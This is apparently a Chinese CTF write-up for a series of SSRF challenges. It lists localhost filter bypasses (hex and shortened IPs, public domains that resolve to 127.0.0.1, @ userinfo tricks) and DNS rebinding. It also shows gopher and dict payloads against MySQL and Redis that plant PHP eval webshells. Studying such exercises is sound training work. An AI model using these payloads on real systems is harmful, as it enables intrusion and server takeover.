## web351

存在一个flag.php页面，访问会返回不是本地用户的消息，
那我们直接以本地用户去探测内网下的flag.php就可以了

代码如下：

![img](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220123222643251-2090227259.png)

## web352:

增加了http/https的限制
[![img](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220123224924201-944249022.png)](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220123224924201-944249022.png)
但是注意！这里很多人以为不能有localhost/127.0.0.1,错
他这里的代码写错了

```
if(!preg_match('/localhost|127.0.0/')
```

#### 由于没有规定匹配的变量，导致这句话必返回为真

所以上一题的答案依旧可以用
直接拿到flag

```
url=http://localhost/flag.php
```

## web353:

这道题和上一题比较就增加了匹配的变量，不能有localhost/127.0.
绕过方法有很多



```
进制绕过 		url=http://0x7F000001/flag.php
0.0.0.0绕过		url=http://0.0.0.0/flag.php
特殊的地址0，		url=http://0/flag.php
还有			url=http://127.1/flag.php
还有			url=http://127.0000000000000.001/flag.php
```

[![img](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220123225824090-953524738.png)](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220123225824090-953524738.png)

## web354:

#### 增加了0和1的过滤

这就有些难搞了。。
难道要我买一个域名解析到127.0.0.1 ？
不可能= =坚决白嫖
于是我决定百度找几个
[![img](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220123233728819-1024669034.png)](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220123233728819-1024669034.png)
好嘞，问题解决
直接拿flag



```
url=http://safe.taobao.com//flag.php
```

[![img](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220123233840599-2122591319.png)](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220123233840599-2122591319.png)

### 域名就放到这里啦



```
http://safe.taobao.com/
http://114.taobao.com/
http://wifi.aliyun.com/
http://imis.qq.com/
http://localhost.sec.qq.com/
http://ecd.tencent.com/
```

# web355

### 增加了域名长度小于5的限制



```
if ((strlen($host) <= 5))
```

简单，旧方法绕过



```
特殊的地址0，		url=http://0/flag.php
还有			url=http://127.1/flag.php
```

[![img](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220124000400839-1217720763.png)](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220124000400839-1217720763.png)

# web356

将上一题的条件域名长度小于5改成了小于3



```
特殊的地址0，		url=http://0/flag.php
```

再次旧方法绕过
[![img](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220124000131245-591565073.png)](https://img2022.cnblogs.com/blog/2289942/202201/2289942-20220124000131245-591565073.png)

#### 值得注意的地方是

#### `0`在linux系统中会解析成`127.0.0.1`，而在windows中会解析成`0.0.0.0`

## 357(DNS重绑定)

<?php 
error_reporting(0); 
highlight_file(__FILE__); 
$url=$_POST['url']; 
$x=parse_url($url); 
if($x['scheme']==='http'||$x['scheme']==='https'){ 
$ip = gethostbyname($x['host']); 
echo '</br>'.$ip.'</br>'; 
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) { 
    die('ip!'); 
} 

echo file_get_contents($_POST['url']); 
} 
else{ 
    die('scheme'); 
} 
?>
函数解析：

gethostbyname() 返回主机名 hostname 对应的 IPv4 互联网地址。

FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）

FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP

（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）

FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP 

（比如 192.168.0.1）

FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。

该标志接受 IPV4 和 IPV6 值。

不能有内网ip，所以填一个公网ip:

DNS重绑定


File_get_contents 得到 flag.php

![img](https://img-blog.csdnimg.cn/2021041523534036.png#pic_center)

## 358(URL BYPASS)

<?php 
error_reporting(0); 
highlight_file(__FILE__); 
$url=$_POST['url']; 
$x=parse_url($url); 
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){ 
    echo file_get_contents($url); 
}
正则表达式的意思是以http://ctf.开头，以show结尾。

payload:

http://ctf.@127.0.0.1/flag.php?show

## 359

打开是登录框，先随便输点什么，然后抓包
发现有个returl参数，并且可以随意更改url，这应该就是我们的利用点了

![img](https://img-blog.csdnimg.cn/20210206162154858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW9sb25nMjIzMzM=,size_16,color_FFFFFF,t_70)

然后就是gopher协议打mysql,这里用到这个工具gopherus

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210206163407411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW9sb25nMjIzMzM=,size_16,color_FFFFFF,t_70)

python gopherus.py --exploit mysql
生成一句话木马

select "<?php @eval($_POST['cmd']);?>" into outfile '/var/www/html/2.php';

记得把_后面那一大段内容再url编码一次，发送

访问2.php,cat一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210206164132720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW9sb25nMjIzMzM=,size_16,color_FFFFFF,t_70)

## web360:

精神状态良好：

## web360——Gopher协议打redis

端口为6379同样操作就可以了😊，但是我把环境干废了i🙃

![image-20210908164829918](https://img-blog.csdnimg.cn/img_convert/b3ff5d0227f3bcfd03ab8e00d4b6302e.png)

### 这个没用，我服了

一个好方法：dict（不怎么了解）

先看能不能用：

url=dict://127.0.0.1:6379/     (如果是ok就可以用)

url=dict://127.0.0.1:6379/info  (要不要公钥)

url=dict://127.0.0.1:6379/config:set:dir:/var/www/htnl   （靶机的环境地址） 

url=dict://127.0.0.1:6379/set:shell:"\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x62\x69\x74\x5d\x29\x3b\x3f\x3e"

(写了一个shell，一句话木马：密码是bit)

url=dict://127.0.0.1:6379/config:set:dbfilename:1.php

url=dict://127.0.0.1:6379/save               (保存文件)

访问文件直接连接

